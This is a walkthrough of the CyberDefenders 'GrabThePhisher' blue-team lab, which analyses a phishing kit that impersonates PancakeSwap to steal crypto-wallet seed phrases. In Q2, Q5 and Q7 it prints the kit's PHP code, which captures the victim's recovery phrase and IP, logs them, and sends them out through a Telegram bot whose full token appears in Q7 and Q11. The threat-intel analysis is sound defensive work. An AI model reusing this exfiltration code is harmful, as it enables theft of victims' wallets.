---
title: "GrabThePhisher"
classes: wide
header:
  teaser: /assets/images/Covers/GrabThePhisher.jpeg
ribbon:   Green
description: "A Walkthrough to the Cyberdefenders blue team lab focusing on Threat Intel and Reverse Engineering."
categories:
  - Reverse Engineering
toc: true
---



# [**GrabThePhisher**](https://cyberdefenders.org/blueteam-ctf-challenges/95/)
## **Scenario**

An attacker compromised a server and impersonated `https://pancakeswap.finance/`, a decentralized exchange native to BNB Chain, to host a phishing kit at `https://apankewk.soup.xyz/mainpage.php`. The attacker set it as an open directory with the file name `pankewk.zip`. 

Provided the phishing kit, you as a soc analyst are requested to analyze it and do your threat intel homework.

**Author:** Milann SHRESTHA     
**Difficulty:** Easy 

## Walkthrough
We start by unzipping the file named `c75-GrabThePhisher.zip`, which has been provided, using `cyberdefenders.org` as password.

### **Q1:** Which wallet is used for asking the seed phrase?

After decompressing, we are left with some files including an HTML file, exploring the content we see some wallets, only one of these wallets matches 

![alt text](/assets/images/reverse-engineering/GrabThePhisher/wallets.png)

Exploring the code, We see that only one wallet that has a "onclick" event for its buttons is `MetaMask` which uses JavaScript (vib(1); jj2 = true; jj = true;). This is commonly designed for asking the seed phrase.

![alt text](/assets/images/reverse-engineering/GrabThePhisher/index-3.png)
![alt text](/assets/images/reverse-engineering/GrabThePhisher/index-1.png) 
![alt text](/assets/images/reverse-engineering/GrabThePhisher/index-2.png)

>**Answer:** `Meta****`

___

### **Q2:** What is the file name that has the code for the phishing kit?

Opening the Metamask folder, there are three files: 
- Fonts
- index.html
- metamask.php

Inside the `metamask.php`, we see thee following code:

```php
$date = date("m.d.Y");
$message = "<b>Welcome 2 The Jungle </b> 
    
<b>Wallet:</b> Metamask
<b>Phrase:</b> <code>" . $_POST["data"] . "</code>
<b>IP:</b> " .$_SERVER['REMOTE_ADDR'] . " | " .$geo. " | " .$city. "
<b>User:</b> " . $_SERVER['HTTP_USER_AGENT'] . "";
```
This constructs an HTML-formatted message containing:
- The wallet type (MetaMask is hardcoded).
- The recovery phrase entered by the victim `$_POST["data"]`.
- The attacker captures this phrase, which can be used to take full control of the victim’s wallet.
- The IP address, geolocation (country and city), and the user-agent string (browser and device information).

So, this is the file that  has the code for the phishing kit.

>**Answer:** `Meta****.php`

___

### **Q3:** In which language was the kit written?

>**Answer:** `PHP`

___


### **Q4:** What service does the kit use to retrieve the victim's machine information?

At the beginning the code, we see the following block:

```php
$request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
$array = json_decode($request);
$geo = $array->country->name_en;
$city = $array->city->name_en;
```

This block of code uses the `Sypex Geo` API to retrieve the geolocation of the user based on their IP address `$_SERVER['REMOTE_ADDR']`, The country and city names are extracted and stored in $geo and $city.

>**Answer:** `Sy*** G**`

___

### **Q5:** How many seed phrases were already collected?

later in the code, we see this block:

```php
$_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";
@file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);	
```

Which is used to ensures the attacker has a backup of the stolen phrases, the recovery phrase `$_POST['data']` is also logged locally in a file `log.txt` on the server.

Now, we go the `log.txt`, we see that it has 3 already collected phrases:

![alt text](/assets/images/reverse-engineering/GrabThePhisher/logs.png)

>**Answer:** `3`

___

### **Q6:** Write down the seed phrase of the most recent phishing incident?

>**Answer:** `father also recycle ******** ******** ******** ******** ******** ******** ******** ********`

___

### **Q7:** Which medium had been used for credential dumping?

The following block of code uses the `sendTel()` function to send a crafted message to a Telegram chat.

The Telegram Bot API is used here. The bot token `$token` and chat ID `$id` are hardcoded.

It constructs the Telegram API URL and uses `file_get_contents()` to send the message via the bot, delivering the stolen information (recovery phrase, IP, etc.) to the attacker's Telegram account.

```php
sendTel($message);  
	
function sendTel($message){
    $id = "5442785564"; 
    $token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10"; 
    $filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
    file_get_contents($filename);
```

>**Answer:** `Tele****`

___

### **Q8:** What is the token for the channel?

>**Answer:** `5457463144:AAG8t4k7e2e************************`

___

### **Q9:** What is the chat ID of the phisher's channel?

>**Answer:** `5442******`

___

### **Q10:** What are the allies of the phish kit developer?

The attacker had fingerprinted his code with the following greeting message:

```php
/*
 With love and respect to all the hustler out there,
 This is a small gift to my brothers,
 All the best with your luck,
 
 Regards, 
 j1j1b1s@m3r0
 */
```

>**Answer:** `j1j1b1s@****`

___

### **Q11:** What is the full name of the Phish Actor?

Using the following request to the getChat method:

```php
https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564
```

The response is:

![alt text](/assets/images/reverse-engineering/GrabThePhisher/api_response.png)

>**Answer:** `Mar*** Aure****lius****`

___

### **Q12:** What is the username of the Phish Actor?

>**Answer:** `pumpkin****`


___
___

<p align="center"><span style="color:#00FFFF;">THE END</span></p>


___
___